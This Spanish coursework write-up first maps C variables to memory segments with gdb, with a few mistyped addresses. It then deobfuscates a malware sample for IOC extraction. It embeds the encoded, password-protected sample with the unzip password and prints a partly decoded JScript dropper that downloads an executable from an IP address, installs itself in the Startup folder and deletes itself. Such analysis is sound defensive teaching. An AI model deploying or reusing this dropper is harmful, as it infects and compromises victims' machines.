<ul>
<li><strong>Tipo:</strong> int. Entero con signo.</li>
<li><strong>Ámbito:</strong> Local. De bloque. Solo visible dentro de <code>f</code>.</li>
<li><strong>Duración:</strong> Estática. No se destruye al salir de <code>f</code>. Aunque está declarada dentro de una función (f), la palabra clave static le dice al compilador que la trate como una global en cuanto a su vida (dura todo el programa), pero con ámbito local (solo visible en f).</li>
<li><strong>Ubicación (Segmento):</strong> BSS. Al no tener valor, va al BSS.</li>
<li><strong>Valor por defecto:</strong> 0, por ser estática sin inicializar explícitamente.</li>
</ul>
<p><img src="capturas/gdbgui-eni.png" alt="gdbgui-eni"></p>
<p><strong>Dirección de la variable <code>eni</code>:</strong></p>
<pre class="hljs"><code><div>p &amp;eni
$1 = (int *) 0x555555558038 &lt;eni&gt;
(gdb) 
</div></code></pre>
<p>Dirección de esta variable: <code>0x555555555038</code>.</p>
<ul>
<li>Por el mismo razonamiento anterior con las secciones:
<ul>
<li>Inicio de <code>.bss</code>: <code>0x55555555803</code>.</li>
<li>Fin de <code>.bss</code>: <code>0x555555558040</code>.</li>
<li><strong><mark>Concluimos que la dirección de <code>eni</code> cae dentro del rango de la sección <code>.bss</code>, por lo tanto la variable <code>eni</code> está en <code>.bss</code>.</mark></strong></li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="4-ei-est%C3%A1tica-inicializada"><strong>4. <code>ei</code> (Estática Inicializada)</strong></h3>
<ul>
<li><strong>Tipo:</strong> int. Entero con signo.</li>
<li><strong>Ámbito:</strong> Local. De bloque. Solo visible dentro de <code>f</code>.</li>
<li><strong>Duración:</strong> Estática. No se destruye al salir de <code>f</code>. Aunque está declarada dentro de una función (<code>f</code>), la palabra clave <code>static</code> le dice al compilador que la trate como una global en cuanto a su vida (dura todo el programa), pero con ámbito local (solo visible en <code>f</code>).</li>
<li><strong>Ubicación (Segmento):</strong> Data Segment. Al ser <code>static</code> y tener un valor asignado <code>= 99</code>, se guarda junto con las globales inicializadas.</li>
<li><strong>Valor por defecto:</strong> 99, valor de inicialización explícito.​</li>
</ul>
<p><img src="capturas/gdbui-ei-ok.png" alt="gdbgui-ei"></p>
<p><strong>Dirección de la variable <code>ei</code>:</strong></p>
<pre class="hljs"><code><div>(gdb) p &amp;ei
$2 = (int *) 0x55555555802c &lt;ei&gt;
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>ei</code> se encuentra en la dirección: <code>0x55555555802c</code>.</li>
</ul>
<p><strong>Revisamos dónde cae esa dirección <code>0x55555555802c</code>:</strong><br>
Comparamos esta dirección con el resultado de <code>maintenance info sections</code>. Así identificaremos si la variable está en .data, .bss, heap, stack, etc.</p>
<pre class="hljs"><code><div>(gdb) maintenance info sections
 ......
 [24]     0x555555558018-&gt;0x555555558030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x555555558030-&gt;0x555555558040 at 0x00003030: .bss ALLOC
 [26]     0x00000000-&gt;0x0000001e at 0x00003030: .comment READONLY HAS_CONTENTS
 ......
</div></code></pre>
<p>donde:</p>
<ul>
<li>Inicio de <code>.data</code>: <code>0x555555558018</code>.</li>
<li>Fin de <code>.data</code>: <code>0x555555558030</code>.</li>
<li>Dirección <code>de ei</code>: <code>0x55555555802c</code>.</li>
<li><strong><mark>Concluimos que la dirección de <code>ei</code> cae dentro del rango de la sección <code>.data</code>, por lo tanto la variable <code>ei</code> está en <code>.data</code>.</mark></strong></li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="5-pae-el-puntero-en-s%C3%AD-y-pae-el-contenido-apuntado--memoria-din%C3%A1mica"><strong>5. <code>pae</code> (El puntero en sí) y <code>*pae</code> (El contenido apuntado / Memoria Dinámica)</strong></h3>
<p><strong><code>pae:</code></strong></p>
<ul>
<li><strong>Tipo:</strong> int *. Puntero a entero.</li>
<li><strong>Ámbito:</strong> De bloque. Solo visible dentro de main.</li>
<li><strong>Duración:</strong> Automática. Es una variable local automática declarada dentro de main sin static. Solo dura mientras main se ejecuta.</li>
<li><strong>Ubicación (Segmento):</strong> Stack (Pila).</li>
<li><strong>Valor por defecto:</strong> Valor inicial: el valor devuelto por la instrucción <code>malloc(sizeof(int))</code> que en cuanto se ejecute esa intrucción será, una dirección del heap. Si pae se declara sin inicializar, entonces contendrá un valor indeterminado, que es basura del stack, hasta que se le asigne algo.</li>
</ul>
<p><strong><code>*pae</code>:</strong></p>
<ul>
<li><strong>Tipo:</strong> int. Es un bloque de memoria para un entero (int). El entero al que apunta.</li>
<li><strong>Ámbito:</strong> No tiene nombre en el código, se accede vía el puntero. *pae = “el contenido de la dirección almacenada en pae”. Solo podemos llegar a él a través del puntero. En verdad, <strong>NO es una variable, es un objeto dinámico</strong> al que apunta <code>pae</code>.</li>
<li><strong>Duración:</strong> Dinámica, mientras no se haga free(pae).</li>
<li><strong>Ubicación (Segmento):</strong> Heap (Montón). La función malloc(sizeof(int)) solicita espacio en esta zona de memoria dinámica. pae (en el Stack) guarda la dirección de este bloque (en el Heap).</li>
<li><strong>Valor por defecto:</strong> Indeterminado (Basura). <code>malloc</code> reserva memoria pero no la inicializa, por lo que el contenido es basura hasta que se le asigne en la instrucción ➞ ➞ ➞ *pae = 100;.</li>
</ul>
<p><strong>Recordemos el mapa de memoria para el proceso:</strong></p>
<pre class="hljs"><code><div>(gdb) info proc mappings
process 56991
Mapped address spaces:

Start Addr         End Addr           Size               Offset             Perms File
....
0x0000555555559000 0x000055555557a000 0x21000            0x0                rw-p  [heap]
....
0x00007ffffffde000 0x00007ffffffff000 0x21000            0x0                rw-p  [stack]
....
</div></code></pre>
<p>donde:</p>
<ul>
<li>Inicio del <code>heap</code>: <code>0x000055555555900</code>.</li>
<li>Fin del <code>heap</code>: <code>0x000055555557a000</code>.</li>
<li>Inicio del <code>stack</code>: <code>0x00007ffffffde000</code>.</li>
<li>Fin del <code>stack</code>: <code>0x00007ffffffff000</code>.</li>
</ul>
<p><strong>Estamos en el breakpoint de la línea 17, justo antes de ejecutar la llamada a malloc:</strong><br>
<img src="capturas/puntero-pae-pk.png" alt="puntero-pae">
donde:</p>
<ul>
<li>addr = 0x00007fffffffdbf0 que está dentro del rango de la zona de memoria del stack.</li>
<li><code>pae</code> es una variable local automática de tipo int * que vive en el stack de main. En este punto GDB resuelve <code>pae = 0x7fffffffdbf0</code> (valor del puntero), que es basura porque aún no se ha ejecutado <code>pae = malloc(sizeof(int));</code>.</li>
<li>En el panel de memory, los bytes <code>01 00 00 00 00 00 00 00</code> son simplemente la “basura” que hay en esa zona del stack antes de inicializar <code>pae</code> con el resultado de <code>malloc</code>.</li>
</ul>
<p><strong>Recordando los operadores:</strong></p>
<ul>
<li><code>&amp;x</code> devuelve la dirección de la variable <code>x</code>.</li>
<li><code>*p</code> accede al valor al que apunta el puntero <code>p</code>.</li>
</ul>
<p><strong>En nuestro caso:</strong></p>
<ul>
<li>
<p><code>pae</code></p>
<ul>
<li>Es la variable puntero.</li>
<li>Está dentro rango de direcciones reservado para el <code>stack</code>.</li>
<li>Su valor es “una dirección” (actualmente basura).</li>
</ul>
</li>
<li>
<p><code>&amp;pae</code></p>
<ul>
<li>Es la dirección de la variable <code>pae</code>.</li>
<li>Tipo: <code>int *</code>.</li>
<li>En GDB vemos:<pre class="hljs"><code><div>(gdb) p &amp;pae
$3 = (int **) 0x7fffffffdb58
</div></code></pre>
Es el hueco del stack donde se guarda el puntero pae (zona <code>0x7fffffffdbf0</code>… → stack).</li>
</ul>
</li>
<li>
<p><code>*pae</code></p>
<ul>
<li>Es el entero al que apunta pae.</li>
<li>En este breakpoint concreto pae no apunta a nada válido, así que hacer *pae o &amp;*pae tiene un comportamiento indefinido.</li>
</ul>
</li>
<li>
<p><code>&amp;*pae</code></p>
<ul>
<li>En general, para un puntero válido, es la dirección del entero al que apunta pae y se cumple <code>&amp;*pae == pae</code>.</li>
<li>Aquí GDB imprime:<pre class="hljs"><code><div>(gdb) p &amp;*pae
$4 = (int *) 0x7fffffffdbf0
</div></code></pre>
Pero ese valor no tiene significado real en el programa, porque pae todavía contiene basura.</li>
</ul>
</li>
</ul>
<p><strong>En este breakpoint concreto:</strong></p>
<ul>
<li><code>pae ≈ 0x7fffffffdbf0</code> Basura.</li>
<li><code>&amp;pae = 0x7fffffffdb58</code> Dirección del puntero en el stack. También está en el rango de direcciones reservado para el stack</li>
</ul>
<p><strong>Estamos en el breakpoint de la línea 18, justo despues de ejecutar la llamada a malloc:</strong>
<img src="capturas/puntero-pae-2.png" alt="puntero-pae-2.png">
donde:</p>
<ul>
<li>
<p><code>&amp;pae = 0x7fffffffdb58</code></p>
<ul>
<li>Es la dirección de la variable pae.</li>
<li><strong><mark>Esa dirección cae en la zona 0x7fffffffdb58, que corresponde al stack.</mark></strong></li>
<li>Es “el hueco de stack” donde se almacena el puntero pae.</li>
</ul>
</li>
<li>
<p><code>&amp;*pae = 0x5555555596b0</code></p>
<ul>
<li>El resultado de evaluar &amp;*pae es 0x5555555596b0.</li>
<li>Por la identidad del lenguaje C, cuando pae es un puntero válido, &amp;*pae es exactamente el mismo valor que pae.</li>
<li>Es decir, 0x5555555596b0 es la dirección de memoria a la que apunta el puntero pae.</li>
<li>Esa dirección cae en la zona 0x5555555596b0, está en el rango de direcciones reservado para el ``, donde está el <code>int</code> reservado con <code>malloc</code>.</li>
</ul>
</li>
<li>
<p><code>pae 0x5555555596b0 int *</code>:</p>
<ul>
<li>pae es la variable automática en el <code>stack</code>.</li>
<li><strong><mark>Su contenido actual es 0x5555555596b0, que es la dirección en el <code>heap</code> del objeto <code>int</code> que se ha reservado.</mark></strong></li>
<li>Se cumple la identidad (mientras pae sea un puntero válido (no basura, no NULL)): <code>&amp;*pae == pae</code>.</li>
</ul>
</li>
</ul>
<p><strong>Estamos en el breakpoint de la línea 21:</strong><br>
<img src="capturas/puntero-pae-3.png" alt="puntero-pae-3.png">
donde:</p>
<ul>
<li>
<p><code>pae</code>:</p>
<ul>
<li>Variable automática en stack.</li>
<li>Tipo <code>int *</code>.</li>
<li>Dirección de la variable: <code>&amp;pae = 0x7fffffffdb58</code> (stack).</li>
<li>Valor actual: <code>pae = 0x5555555596b0</code> (dirección de heap).</li>
</ul>
</li>
<li>
<p><code>*pae</code>:</p>
<ul>
<li>Objeto <code>int</code> en el heap (memoria dinámica).</li>
<li>Dirección: <code>&amp;*pae = 0x5555555596b0</code> (igual que <code>pae</code>).</li>
<li>Valor actual: 100.</li>
<li>En el panel de memoria: bytes <code>64 00 00 00 ....</code> Ques es 100 en hexadecimal.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="tabla-resumen-de-las-variables"><strong>Tabla resumen de las variables</strong></h2>
<table>
<thead>
<tr>
<th>Variable</th>
<th>Tipo</th>
<th>Ámbito / Clase</th>
<th>Duración</th>
<th>Segmento de memoria</th>
<th>Valor por defecto al inicio del programa</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>int gni;</code></td>
<td><code>int</code></td>
<td>Global, sin inicializar</td>
<td>Estática</td>
<td><code>.bss</code></td>
<td><code>0</code></td>
</tr>
<tr>
<td><code>int gi = 99;</code></td>
<td><code>int</code></td>
<td>Global, inicializada</td>
<td>Estática</td>
<td><code>.data</code></td>
<td><code>99</code></td>
</tr>
<tr>
<td><code>static int eni;</code></td>
<td><code>int</code></td>
<td>Estática local no inicializada. <code>static</code> local en <code>f()</code></td>
<td>Estática</td>
<td><code>.bss</code></td>
<td><code>0</code></td>
</tr>
<tr>
<td><code>static int ei = 99;</code></td>
<td><code>int</code></td>
<td>Estática local inicializada. <code>static</code> local en <code>f()</code></td>
<td>Estática</td>
<td><code>.data</code></td>
<td><code>99</code></td>
</tr>
<tr>
<td><code>int *pae</code></td>
<td><code>int *</code></td>
<td>Local en <code>main</code></td>
<td>Automática</td>
<td><strong>Stack</strong> (pila)</td>
<td>Sin valor por defecto (pero se inicializa con <code>malloc</code>)</td>
</tr>
<tr>
<td><code>*pae</code></td>
<td><code>int</code></td>
<td>Dato apuntado por <code>pae</code></td>
<td>Dinámica.</td>
<td><strong>Heap</strong></td>
<td>Indeterminado (basura tras <code>malloc</code>, hasta hacer <code>*pae = 100</code>)</td>
</tr>
</tbody>
</table>
<div style="page-break-before: always;"></div>
<h2 id="esquema-general-de-la-memoria-para-esas-variables"><strong>Esquema general de la memoria para esas variables</strong></h2>
<pre class="hljs"><code><div>   Direcciones bajas
   ┌───────────────────────────────────────────────────────┐
   │                 Código (.text)                        |
   |   código de main, f, printf, etc.                     │
   ├───────────────────────────────────────────────────────┤
   │              Datos inicializados (.data)              │
   │   - gi = 99    (global int = 99)                      │
   │   - ei = 99    (static int en f() = 99)               │
   ├───────────────────────────────────────────────────────|
   │               Datos no inic. (.bss)                   │
   │   - gni = 9   (global int sin inicializar)            │
   │   - eni = 0   (static int en f() sin inicializar)     │
   ├───────────────────────────────────────────────────────┤
   │                Heap (montículo)                       │ 
   │   [ int ] = 100   ← *pae  (dirección: 0x5555555596b0) │ 
   │                                                       |
   ├───────────────────────────────────────────────────────┤
   │   ... espacio libre ...                               │
   ├───────────────────────────────────────────────────────┤
   │                   Stack (pila)                        │
   │   - variables de main:                                │
   │       pae (int *)  → contiene 0x5555555596b0          │
   └───────────────────────────────────────────────────────┘
   Direcciones altas
</div></code></pre>
<hr>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-6---desofuscaci%C3%B3n-de-un-programa"><strong>Ejercicio 6 - Desofuscación de un programa</strong></h1>
<p>Debes analizar este fragmento y extraer la funcionalidad que posee y los IOC (Indicadores de compromiso1) asociados (dominios, IP, etc) para crear reglas eficaces en los sistemas de defensa de la empresa.</p>
<ul>
<li>Deberéis de desofuscar el ejemplar.</li>
<li>Analizad de forma estática (no lo ejecutéis bajo nigún concepto) su comportamiento y describid que hace o parece hacer.</li>
<li>Extraer los IOCs si es que existe alguno.</li>
<li>EXPLICAD PASO A PASO (si es con imágenes mejor) como lo hacéis.</li>
</ul>
<pre class="hljs"><code><div>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
</div></code></pre>
<p>Ese fragmento está codificado y comprimido, luego tenéis que realizar las siguientes operaciones para obtener el original (vamos a suponer que lo habéis guardado en un archivo: mrev_t1_exe6.txt):</p>
<ul>
<li>$ base64 -d mrev_t1_exe6.txt &gt; mrev_t1_exe6.zip</li>
<li>$ unzip ejercicio.zip</li>
<li>La contraseña es: master2021</li>
</ul>
<p>Pistas:</p>
<ul>
<li>Nada es lo que parece a simple vista</li>
<li>Javascript es un lenguaje con un comportamiento…curioso</li>
<li>A veces es mejor intentar cosas pequeñas, de forma aislada…</li>
<li>Node es tu amigo</li>
<li>Sustitución es mejor que fuerza bruta</li>
</ul>
<p><img src="capturas/precaución.png" alt="Precaución"></p>
<hr>
<h2 id="desofuscaci%C3%B3n-del-archivo"><strong>Desofuscación del archivo</strong></h2>
<h3 id="buscamos-finalizaciones-de-l%C3%ADnea"><strong>Buscamos finalizaciones de línea</strong></h3>
<p><img src="capturas/ejercicio6-1.png" alt="ejercicio6-1.png"></p>
<h3 id="b%C3%BAsqueda-de-cadenas-con-uxxxx"><strong>Búsqueda de cadenas con <code>\uXXXX</code>:</strong></h3>
<p>Cada <code>\uXXXX</code> es un carácter Unicode en hexadecimal. Ejemplo:</p>
<ul>
<li><code>\u0041 → A</code></li>
<li><code>\u0063 → c</code></li>
<li><code>\u0074 → t</code></li>
<li><code>\u0069 → i</code></li>
<li><code>\u0076 → v</code></li>
<li><code>\u0065 → e</code></li>
</ul>
<h3 id="eliminamos-corchetes-seguidos-de-un-punto"><strong>Eliminamos corchetes seguidos de un punto</strong></h3>
<p>Esto <code>{...}</code> es Basura. Solo importa lo que está entre comillas.</p>
<p>Vamos a usar Expresiones Regulares (Regex) para quitar esa basura. En Visual Studio:</p>
<ul>
<li>Abrimos &quot;Buscar y Reemplazar&quot;.</li>
<li>Activamos el botón de &quot;Usar Expresión Regular&quot;.</li>
<li>Buscamos: <code>\{[^{}]+:(&quot;.*?&quot;)\}\.[a-zA-Z0-9]+</code></li>
<li>Reemplazamos con: <code>$1</code>. Mantendrá sólo lo que encuentra dentro del primer paréntesis (las comillas).</li>
</ul>
<p><img src="capturas/ejercicio6-2-ok.png" alt="ejercicio6-2.png"></p>
<h3 id="quitar-los-s%C3%ADmbolos-de-suma"><strong>Quitar los símbolos de suma</strong></h3>
<p>Ahora vamos a quitar los <code>+</code>:</p>
<ul>
<li>Abrimos &quot;Buscar y Reemplazar&quot;.</li>
<li>Activamos el botón de &quot;Usar Expresión Regular&quot;.</li>
<li>Buscamos: <code>&quot;\+&quot;</code>.</li>
<li>Reemplazamos con: Dejamos vacío.</li>
</ul>
<p><img src="capturas/ejercicio6-3.png" alt="ejercicio6-3.png"></p>
<h3 id="convertir-todos-los-u00xx-a-caracteres"><strong>Convertir todos los u00xx a caracteres</strong></h3>
<p>Podemos usar el propio navegador para hacer esa conversión:</p>
<ul>
<li>
<p>Copiamos el bloque con las comillas y las secuencias <code>\u00xx</code> (por ejemplo <code>\\u0041\\u0063...</code>).</p>
</li>
<li>
<p>En la consola del browser usamos:</p>
<pre class="hljs"><code><div>// Pegamos las cadenas ofuscadas
const s = &quot;\\u0041\\u0063\\u0074\\u0069\\u0076\\u0065\\u0058\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074&quot;;

const decoded = s.replace(/\\u[0-9a-fA-F]{4}/g, m =&gt;
  String.fromCharCode(parseInt(m.slice(2), 16))
);

console.log(decoded);  // Veremos el resultado desofuscado la cadena
</div></code></pre>
<p><img src="capturas/ejercicio6-4.png" alt="ejercicio6-4.png"></p>
</li>
<li>
<p>Reemplazamos en el archivo el texto ofuscado por el decoded que ha impreso el console.log.</p>
<pre class="hljs"><code><div>var pre_computer = this[&quot;ActiveXObject&quot;]
</div></code></pre>
</li>
</ul>
<div style="page-break-before: always;"></div>
<p>Repetimos el proceso con Node:</p>
<ul>
<li>
<p>Creamos un archivo decode.js:</p>
<pre class="hljs"><code><div>let s = &quot;\\u0057\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074&quot;;

let decoded = s.replace(/\\u[0-9a-fA-F]{4}/g, m =&gt;
  String.fromCharCode(parseInt(m.slice(2), 16))
);

console.log(decoded);
</div></code></pre>
</li>
<li>
<p>Ejecutamos este archivo con node:
<img src="capturas/ejercicio6-5.png" alt="ejercicio6-5.png"></p>
</li>
</ul>
<p>Repetimos el proceso para todas las cadenas ofuscadas. Obtenemos:</p>
<pre class="hljs"><code><div>pre_interactions=null;
pre_including8=null;
pre_with=null;
pre_Similar=null;
pre_customer=null;
pre_with2=null;
pre_training2=null;
pre_provide5=null;
pre_with=null;
pre_malicious1=null;
pre_purposes=null;
pre_software5=null;
varpre_computer=this[&quot;ActiveXObject&quot;];
varWSSS12=this[&quot;WScript&quot;];
varpre_your=WSSS12[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
varpre_your8=newpre_computer(&quot;Scripting.FileSystemObject&quot;)
varfstream=newpre_computer(&quot;ADODB.Stream&quot;);
varoShell=newpre_computer(&quot;Shell.Application&quot;);
varpre_from=pre_your[&quot;ExpandEnvironmentStrings&quot;](&quot;%TEMP%&quot;)
varpre_geolocation6=pre_from+&quot;\\floor](Math[&quot;random&quot;]()*(20+20+5+5+25+25)+1)+&quot;.exe&quot;;
varxhr12=newpre_computer(&quot;Msxml2.ServerXMLHTTP&quot;)
varpre_national7=&quot;\aflash_update.js&quot;
varpre_interactions4=oShell[&quot;NameSpace&quot;&quot;](3+2+2);
arpre_information5=false;
varpre_mobile7=false;
vartone=1;
varpre_following4=0;
arpre_information=0;
varfilets=null;
varpre_your=&quot;&quot;;
varscrpath=WSSS12[&quot;ScriptFullName&quot;];
varautor=pre_interactions4.Self.Path+pre_national7;varpre_overheard=autor;varpre_from=&quot;https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt&quot;;
if(scrpath!=autor&amp;&amp;pre_information5==false){pre_information5=true;
    pre_your8[&quot;DeleteFile&quot;](scrpath);
    WSSS12[&quot;echo&quot;](&quot;he document is corrupted an\d cannot be opened&quot;)
    WSSS12[&quot;Sleep&quot;](5000);
}for(pre_information=0;
    pre_information&lt;pre_overheard.length;
    pre_information++){pre_following4=((pre_following4&lt;&lt;5)-pre_following4+pre_overheard.charCodeAt(pre_information))&amp;0xffffffff;}while(true){tone=tone+1
